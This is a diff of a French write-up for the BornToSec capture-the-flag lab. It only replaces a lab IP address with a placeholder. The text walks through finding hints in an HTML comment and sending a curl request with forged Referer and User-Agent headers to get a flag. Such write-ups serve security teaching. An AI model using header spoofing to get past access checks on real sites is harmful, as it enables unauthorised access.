@@ -11,7 +11,7 @@ Cette méthode permet de tromper un serveur en lui faisant croire que la requêt
 
 ## Comment reproduire la faille
 
-1. Aller sur la page BornToSec ou `http://10.13.248.4/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
+1. Aller sur la page BornToSec ou `http://<IP_ADRESS>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
 
 2. Faire une inspection (F12) sur la page et constater qu'il y a un commentaire avec des indications sensibles, ici: `Referer: https://www.nsa.gov/`, `User-Agent: ft_bornToSec`
 
@@ -20,7 +20,7 @@ Cette méthode permet de tromper un serveur en lui faisant croire que la requêt
      ```bash
      curl -H "Referer: https://www.nsa.gov/" \
           -H "User-Agent: ft_bornToSec" \
-          "http://10.13.248.4/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
+          "http://<IP_ADRESS>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
      ```
 
 4. Observer la réponse pour trouver le flag 
